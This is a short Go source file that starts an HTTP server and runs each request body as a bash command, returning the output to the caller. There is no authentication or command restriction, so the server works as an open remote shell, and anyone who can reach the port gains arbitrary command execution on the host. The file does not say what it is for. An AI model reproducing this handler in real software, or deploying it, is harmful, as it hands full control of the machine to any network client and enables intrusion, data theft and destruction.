package lib

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os/exec"
)

func StartServer(conf Opts) {
	http.HandleFunc("/", handler)
	log.Printf("server started on port %s", conf.Port)
	err := http.ListenAndServe(fmt.Sprintf(":%s", conf.Port), nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

func shellout(command string) (string, string, error) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command("bash", "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return stdout.String(), stderr.String(), err
}

func handler(w http.ResponseWriter, req *http.Request) {
	b, err := io.ReadAll(req.Body)
	if err != nil {
		fmt.Printf("err %v", err)
		fmt.Fprint(w, err)
	}

	out, errout, err := shellout(string(b))
	if err != nil {
		log.Printf("error: %v\n", err)
	}
	if errout != "" {
		fmt.Printf("stderr %v", errout)
		fmt.Fprint(w, errout)
	} else {
		fmt.Printf("stdout %v", out)
		fmt.Fprint(w, out)
	}
}
